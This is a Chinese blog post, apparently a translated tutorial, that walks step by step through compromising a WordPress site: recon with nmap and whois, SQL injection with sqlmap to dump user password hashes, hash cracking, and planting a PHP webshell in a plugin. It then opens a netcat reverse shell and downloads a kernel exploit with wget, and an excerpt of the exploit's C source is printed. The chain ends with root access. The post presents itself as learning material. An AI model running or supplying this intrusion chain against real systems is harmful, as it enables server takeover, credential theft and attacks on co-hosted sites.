<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>双人份 Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="双人份 Blog">
<meta property="og:url" content="http://doubles.me/page/7/index.html">
<meta property="og:site_name" content="双人份 Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="双人份 Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/rss.xml" title="双人份 Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">双人份</a></h1>
		</hgroup>

		
		<p class="header-subtitle">有事邮件我 fjjwlzd(at)163</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">归档</a></li>
				        
							<li><a href="/translate">翻译</a></li>
				        
							<li><a href="/about">关于</a></li>
				        
							<li><a href="/links">友链</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="https://doubleshift.github.io/rss.xml" title="rss">rss</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BackTrack/" style="font-size: 15.71px;">BackTrack</a> <a href="/tags/OpenCV/" style="font-size: 10px;">OpenCV</a> <a href="/tags/android/" style="font-size: 14.29px;">android</a> <a href="/tags/cocos2d/" style="font-size: 12.86px;">cocos2d</a> <a href="/tags/diary/" style="font-size: 12.86px;">diary</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/fml/" style="font-size: 10px;">fml</a> <a href="/tags/hack/" style="font-size: 20px;">hack</a> <a href="/tags/hackthon/" style="font-size: 10px;">hackthon</a> <a href="/tags/javascript/" style="font-size: 10px;">javascript</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/sae/" style="font-size: 14.29px;">sae</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/云/" style="font-size: 14.29px;">云</a> <a href="/tags/内涵/" style="font-size: 11.43px;">内涵</a> <a href="/tags/吐槽/" style="font-size: 11.43px;">吐槽</a> <a href="/tags/开发/" style="font-size: 18.57px;">开发</a> <a href="/tags/微信公众平台/" style="font-size: 14.29px;">微信公众平台</a> <a href="/tags/杂碎/" style="font-size: 12.86px;">杂碎</a> <a href="/tags/淘宝/" style="font-size: 10px;">淘宝</a> <a href="/tags/硬件/" style="font-size: 10px;">硬件</a> <a href="/tags/网站/" style="font-size: 17.14px;">网站</a> <a href="/tags/翻墙/" style="font-size: 14.29px;">翻墙</a> <a href="/tags/自动登入/" style="font-size: 11.43px;">自动登入</a> <a href="/tags/采集/" style="font-size: 11.43px;">采集</a>
					</div>
				</section>
				
				
				

				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">双人份</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img src="http://7xnueu.com1.z0.glb.clouddn.com/avatar.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
			
			</div>
			<hgroup>
			  <h1 class="header-author">双人份</h1>
			</hgroup>
			
			<p class="header-subtitle">有事邮件我 fjjwlzd(at)163</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">归档</a></li>
		        
					<li><a href="/translate">翻译</a></li>
		        
					<li><a href="/about">关于</a></li>
		        
					<li><a href="/links">友链</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/DoubleShift" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="https://doubleshift.github.io/rss.xml" title="rss">rss</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
  
    <article id="post-390" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/24/390/" class="article-date">
  	<time datetime="2013-02-24T07:16:56.000Z" itemprop="datePublished">2013-02-24</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/24/390/">黑客是怎样入侵你的网站的</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的.阅读本文你会学到以下内容：</p>
<p>1.渗透测试前的简单信息收集。</p>
<p>2.sqlmap的使用</p>
<p>3.nmap的使用</p>
<p>4.nc反弹提权</p>
<p>5.linux系统的权限提升</p>
<p>6.backtrack 5中渗透测试工具nikto和w3af的使用等.</p>
<p>假设黑客要入侵的你的网站域名为:hack-test.com</p>
<p>让我们用ping命令获取网站服务器的IP地址.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/11.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/11.png" alt="Web信息安全" title="1"></a></p>
<p>现在我们获取了网站服务器的IP地址为:173.236.138.113</p>
<p>寻找同一服务器上的其它网站，我们使用sameip.org.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033537jjM.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033537jjM.png" alt="渗透测试" title="2"></a></p>
<p>26 sites hosted on IP Address 173.236.138.113</p>
<p><table border="0"><colgroup> <col> <col> <col></colgroup></table></p>
<p><tbody valign="top"></tbody></p>
<p><tr></tr></p>
<p><td valign="center"><strong>ID</strong></td></p>
<p><td valign="center"><strong>Domain</strong></td></p>
<p><td valign="center"><strong>Site Link</strong></td><br></p>
<p><tr></tr></p>
<p><td valign="center">1</td></p>
<p><td valign="center">hijackthisforum.com</td></p>
<p><td valign="center"><a href="http://www.hijackthisforum.com/" title="visit hijackthisforum.com" target="_blank" rel="external">hijackthisforum.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">2</td></p>
<p><td valign="center">sportforum.net</td></p>
<p><td valign="center"><a href="http://www.sportforum.net/" title="visit sportforum.net" target="_blank" rel="external">sportforum.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">3</td></p>
<p><td valign="center">freeonlinesudoku.net</td></p>
<p><td valign="center"><a href="http://www.freeonlinesudoku.net/" title="visit freeonlinesudoku.net" target="_blank" rel="external">freeonlinesudoku.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">4</td></p>
<p><td valign="center">cosplayhell.com</td></p>
<p><td valign="center"><a href="http://www.cosplayhell.com/" title="visit cosplayhell.com" target="_blank" rel="external">cosplayhell.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">5</td></p>
<p><td valign="center">videogamenews.org</td></p>
<p><td valign="center"><a href="http://www.videogamenews.org/" title="visit videogamenews.org" target="_blank" rel="external">videogamenews.org</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">6</td></p>
<p><td valign="center">gametour.com</td></p>
<p><td valign="center"><a href="http://www.gametour.com/" title="visit gametour.com" target="_blank" rel="external">gametour.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">7</td></p>
<p><td valign="center">qualitypetsitting.net</td></p>
<p><td valign="center"><a href="http://www.qualitypetsitting.net/" title="visit qualitypetsitting.net" target="_blank" rel="external">qualitypetsitting.net</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">8</td></p>
<p><td valign="center">brendanichols.com</td></p>
<p><td valign="center"><a href="http://www.brendanichols.com/" title="visit brendanichols.com" target="_blank" rel="external">brendanichols.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">9</td></p>
<p><td valign="center">8ez.com</td></p>
<p><td valign="center"><a href="http://www.8ez.com/" title="visit 8ez.com" target="_blank" rel="external">8ez.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">10</td></p>
<p><td valign="center">hack-test.com</td></p>
<p><td valign="center"><a href="http://www.hack-test.com/" title="visit hack-test.com" target="_blank" rel="external">hack-test.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">11</td></p>
<p><td valign="center">kisax.com</td></p>
<p><td valign="center"><a href="http://www.kisax.com/" title="visit kisax.com" target="_blank" rel="external">kisax.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">12</td></p>
<p><td valign="center">paisans.com</td></p>
<p><td valign="center"><a href="http://www.paisans.com/" title="visit paisans.com" target="_blank" rel="external">paisans.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">13</td></p>
<p><td valign="center">mghz.com</td></p>
<p><td valign="center"><a href="http://www.mghz.com/" title="visit mghz.com" target="_blank" rel="external">mghz.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">14</td></p>
<p><td valign="center">debateful.com</td></p>
<p><td valign="center"><a href="http://www.debateful.com/" title="visit debateful.com" target="_blank" rel="external">debateful.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">15</td></p>
<p><td valign="center">jazzygoodtimes.com</td></p>
<p><td valign="center"><a href="http://www.jazzygoodtimes.com/" title="visit jazzygoodtimes.com" target="_blank" rel="external">jazzygoodtimes.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">16</td></p>
<p><td valign="center">fruny.com</td></p>
<p><td valign="center"><a href="http://www.fruny.com/" title="visit fruny.com" target="_blank" rel="external">fruny.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">17</td></p>
<p><td valign="center">vbum.com</td></p>
<p><td valign="center"><a href="http://www.vbum.com/" title="visit vbum.com" target="_blank" rel="external">vbum.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">18</td></p>
<p><td valign="center">wuckie.com</td></p>
<p><td valign="center"><a href="http://www.wuckie.com/" title="visit wuckie.com" target="_blank" rel="external">wuckie.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">19</td></p>
<p><td valign="center">force5inc.com</td></p>
<p><td valign="center"><a href="http://www.force5inc.com/" title="visit force5inc.com" target="_blank" rel="external">force5inc.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">20</td></p>
<p><td valign="center">virushero.com</td></p>
<p><td valign="center"><a href="http://www.virushero.com/" title="visit virushero.com" target="_blank" rel="external">virushero.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">21</td></p>
<p><td valign="center">twincitiesbusinesspeernetwork.com</td></p>
<p><td valign="center"><a href="http://www.twincitiesbusinesspeernetwork.com/" title="visit twincitiesbusinesspeernetwork.com" target="_blank" rel="external">twincitiesbusinesspeernetwork.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">22</td></p>
<p><td valign="center">jennieko.com</td></p>
<p><td valign="center"><a href="http://www.jennieko.com/" title="visit jennieko.com" target="_blank" rel="external">jennieko.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">23</td></p>
<p><td valign="center">davereedy.com</td></p>
<p><td valign="center"><a href="http://www.davereedy.com/" title="visit davereedy.com" target="_blank" rel="external">davereedy.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">24</td></p>
<p><td valign="center">joygarrido.com</td></p>
<p><td valign="center"><a href="http://www.joygarrido.com/" title="visit joygarrido.com" target="_blank" rel="external">joygarrido.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">25</td></p>
<p><td valign="center">prismapp.com</td></p>
<p><td valign="center"><a href="http://www.prismapp.com/" title="visit prismapp.com" target="_blank" rel="external">prismapp.com</a></td><br></p>
<p><tr></tr></p>
<p><td valign="center">26</td></p>
<p><td valign="center">utiligolf.com</td></p>
<p><td valign="center"><a href="http://www.utiligolf.com/" title="visit utiligolf.com" target="_blank" rel="external">utiligolf.com</a></td><br><br><br><br>173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。</p>
<p>We’ll need more information about your site, such as:</p>
<p>我们需要关于你网站的以下信息：</p>
<p><pre>1.DNS记录（A,NS,TXT,MX 和SOA）<br>2.网站服务器的类型（Apache,IIS,Tomcat）<br>3.域名的注册信息（哪个公司拥有这个域名）<br>4.你的名字，地址，EMAIL和电话<br>5.你的网站上所运行的脚本类型（PHP,ASP,ASP.NET,JSP,CFM）<br>6.服务器的操作系统类型（Unix,Linux,Windows,Solaris）<br>7.服务器对外开放的端口（80,443,21,等）</pre><br>让我们开始找你网站的DNS记录，我们用who.is来完成这一目标.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033556Cnp.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033556Cnp.png" alt="入侵检测" title="3"></a></p>
<p>我们发现你的DNS记录如下</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033610v7Y.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033610v7Y.jpg" alt="web安全" title="4"></a></p>
<p>让我们来确定web服务器的类型</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0336298j2.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0336298j2.png" alt="渗透测试" title="5"></a></p>
<p>发现你的W eb服务器是apache，接下来确定它的版本.</p>
<p><code>**HACK-TEST.COM SITE INFORMATION
**</code></p>
<p><code>IP: [173.236.138.113](http://www.who.is/whois-ip/173.236.138.113/)
Website Status: [active](http://www.hack-test.com/)
Server Type: Apache
Alexa Trend/Rank: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/03363089c.jpg) 1 Month: 3,213,968 3 Month: 2,161,753
Page Views per Visit: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033630bXx.jpg) 1 Month: 2.0 3 Month: 3.7</code></p>
<p>接下来是时候寻找你网站域名的注册信息,你的电话、邮箱、地址等.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033639jhS.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033639jhS.png" alt="渗透测试" title="6"></a></p>
<p>我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.我们可以通过backtrack 5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033641X9q.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033641X9q.png" alt="backtrack 5" title="7"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033643n2v.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033643n2v.png" alt="backtrack 5" title="8"></a></p>
<p>我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为Fedora Linux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap:</p>
<p><strong>1-Find services that run on server(查看服务器上运行的服务)</strong></p>
<p><em>root@bt:~# nmap -sV hack-test.com</em><br><em>Starting Nmap 6.01 ( <a href="http://nmap.org" target="_blank" rel="external">http://nmap.org</a> ) at 2013-02-24 02:13 EST</em><br><em>Nmap scan report for hack-test.com (173.236.164.23)</em><br><em>Host is up (0.27s latency).</em><br><em>rDNS record for 173.236.164.23: apache2-bongo.carter-braxton.dreamhost.com</em><br><em>Not shown: 993 filtered ports</em><br><em>PORT STATE SERVICE VERSION</em><br><em>21/tcp open ftp ProFTPD</em><br><em>22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)</em><br><em>25/tcp open smtp Postfix smtpd</em><br><em>80/tcp open http Apache httpd</em><br><em>587/tcp open smtp Postfix smtpd</em><br><em>5222/tcp open jabber Jabber instant messaging server</em><br><em>5269/tcp open jabber Jabber instant messaging server</em><br><em>Service Info: Host: carter-braxton.dreamhost.com; OS: Linux; CPE: cpe:/o:linux:kernel</em><br><em>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" target="_blank" rel="external">http://nmap.org/submit/</a> .</em><br><em>Nmap done: 1 IP address (1 host up) scanned in 70.35 seconds</em><br><strong>2-Find server OS(查看操作系统版本)</strong></p>
<p>root@bt:~# nmap -O hack-test.com</p>
<p>Starting Nmap 6.01 ( <a href="http://nmap.org" target="_blank" rel="external">http://nmap.org</a> ) at 2013-02-24 03:29 EST<br>Nmap scan report for hack-test.com (173.236.164.23)<br>Host is up (0.28s latency).<br>rDNS record for 173.236.164.23: apache2-bongo.carter-braxton.dreamhost.com<br>Not shown: 993 filtered ports<br>PORT STATE SERVICE<br>21/tcp open ftp<br>22/tcp open ssh<br>25/tcp open smtp<br>80/tcp open http<br>587/tcp open submission<br>5222/tcp open xmpp-client<br>5269/tcp open xmpp-server<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>No OS matches for host</p>
<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" target="_blank" rel="external">http://nmap.org/submit/</a> .</p>
<p>没找到操作系统，奇怪了。和以前的教程不一样，上面ip也改了，同时子站也只剩一个了。</p>
<p>Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误：</p>
<p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
<p>加上 –osscan-guess 也没找到。linux是坑定的<br>现在我们已经收集了所有关于你网站的重要信息, 接下来开始扫描寻找漏洞,比如:</p>
<p>Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF 等等.</p>
<p>我们将使用Nikto来收集漏洞信息:</p>
<p><strong>root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033715leP.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033715leP.png" alt="渗透测试工具backtrack 5" title="11"></a><br>我们也会用到Backtrack 5 R1中的W3AF 工具:</p>
<p><strong>root@bt:/pentest/web/w3af# ./w3af_gui</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033726wq1.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033726wq1.png" alt="渗透测试工具w3af" title="12"></a></p>
<p>我们输入要检测的网站地址,选择完整的安全审计选项.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0337477d1.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0337477d1.png" alt="渗透测试全过程" title="13"></a></p>
<p>稍等一会，你将会看到扫描结果.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033800goJ.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033800goJ.png" alt="web入侵检测" title="14"></a></p>
<p>发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞.</p>
<p><a href="http://hack-test.com/Hackademic_RTB1/?cat=d" target="_blank" rel="external">http://hack-test.com/Hackademic_RTB1/?cat=d</a>％27z％220</p>
<p>我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url.</p>
<p>Using sqlmap with –u url</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033843i8p.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033843i8p.png" alt="sqlmap使用教程" title="17"></a></p>
<p>过一会你会看到</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033847G3z.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033847G3z.png" alt="sqlmap使用教程" title="18"></a></p>
<p>输入N按回车键继续</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033906Gdf.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033906Gdf.png" alt="sqlmap使用教程" title="19"></a></p>
<p>我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033908ogx.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033908ogx.png" alt="sqlmap使用教程" title="20"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033915DFA.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033915DFA.png" alt="sqlmap读取数据库名" title="21"></a></p>
<p>发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033923xvP.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033923xvP.png" alt="sqlmap读取数据库中的表" title="22"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033932N8Y.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/033932N8Y.png" alt="sqlmap读取数据库中的表" title="23"></a></p>
<p>通过参数“-T wp_users –columns ”来查看wp_users表中的字段.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0339413ad.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0339413ad.png" alt="sqlmap使用教程" title="24"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034024Ffd.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034024Ffd.png" alt="sqlmap使用教程" title="25"></a></p>
<p>接下来猜解字段user_login和user_pass的值.用参数”-C user_login,user_pass –dump”</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0340455zY.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0340455zY.png" alt="" title="26"></a></p>
<p>我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes</p>
<p><a href="http://www.onlinehashcrack.com/free-hash-reverse.php" target="_blank" rel="external">http://www.onlinehashcrack.com/free-hash-reverse.php</a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034055giO.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034055giO.png" alt="hash在线破解" title="27"></a></p>
<p>登陆wordpress的后台wp-admin</p>
<p>尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件. 我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的php webshell.<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034116vAU.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034116vAU.png" alt="上传漏洞获得webshell" title="28"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0341256aB.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0341256aB.png" alt="上传漏洞获得webshell" title="29"></a></p>
<p>Php webshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。</p>
<p>我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034130Xjn.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034130Xjn.png" alt="NC反弹" title="32"></a></p>
<p>然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555.<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034145p83.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034145p83.png" alt="NC反弹" title="31"></a></p>
<p>点击连接我们会看到<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034153nRQ.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034153nRQ.png" alt="NC反弹" title="33"></a></p>
<p>&nbsp;</p>
<p>接下来我们尝试执行一些命令：</p>
<p>id</p>
<p>uid=48(apache) gid=489(apache) groups=489(apache)<br>（用来显示用户的id和组）</p>
<p>pwd</p>
<p>/var/www/html/Hackademic_RTB1/wp-content/plugins<br>（显示服务器上当前的路径）</p>
<p>uname -a</p>
<p>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux<br>（显示内核版本信息）</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034220jQo.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034220jQo.png" alt="Linux基础命令" title="34"></a></p>
<p>现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.<br>在服务器上测试了很多exp之后，我们用以下的exp来提升权限.<br><a href="http://www.exploit-db.com/exploits/15285" target="_blank" rel="external">http://www.exploit-db.com/exploits/15285</a></p>
<p>我们在nc shell上执行以下命令:<br><strong>wget <a href="http://www.exploit-db.com/exploits/15285" target="_blank" rel="external">http://www.exploit-db.com/exploits/15285</a> -o roro.c</strong><br>(下载exp到服务器并重命名为roro.c)<br>注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.<br>exp roro.c代码如下：</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#include &lt;unistd.h&gt;</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>#include &lt;fcntl.h&gt;</p>
<p>#include &lt;sys/types.h&gt;</p>
<p>#include &lt;sys/socket.h&gt;</p>
<p>#include &lt;netinet/in.h&gt;</p>
<p>#include &lt;errno.h&gt;</p>
<p>#include &lt;string.h&gt;</p>
<p>#include &lt;sys/ptrace.h&gt;</p>
<p>#include &lt;sys/utsname.h&gt;</p>
<p>#define RECVPORT 5555</p>
<p>#define SENDPORT 6666<br>int prep_sock(int port)<br>{<br>int s, ret;<br>struct sockaddr_in addr;<br>s = socket(PF_RDS, SOCK_SEQPACKET, 0);<br>if(s &lt; 0)<br>{<br>printf(“[*] Could not open socket.n”);<br>exit(-1);<br>}<br>memset(&amp;addr, 0, sizeof(addr));<br>通过以上代码我们发现该exp是C语言开发的，我们需要将他编译成elf格式的,命令如下:</p>
<p><strong>gcc roro.c –o roro</strong></p>
<p>接下来执行编译好的exp</p>
<p><strong>./roro</strong></p>
<p>&nbsp;</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034231h2r.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034231h2r.jpg" alt="exp编译" title="36"></a><br>执行完成之后我们输入id命令</p>
<p>id</p>
<p>我们发现我们已经是root权限了</p>
<p>uid=0(root) gid=0(root)</p>
